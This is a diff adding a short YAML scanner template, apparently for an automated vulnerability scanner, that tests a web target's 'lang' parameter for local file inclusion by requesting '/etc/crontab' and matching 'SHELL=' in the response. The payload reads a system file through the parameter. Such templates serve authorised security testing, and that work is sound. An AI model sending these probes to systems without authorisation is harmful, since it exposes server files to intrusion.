@@ -1,0 +1,20 @@
+id: lfi6-1108
+name: 'Traversal in lang'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via lang'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      lang:
+        - '/etc/crontab'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SHELL='
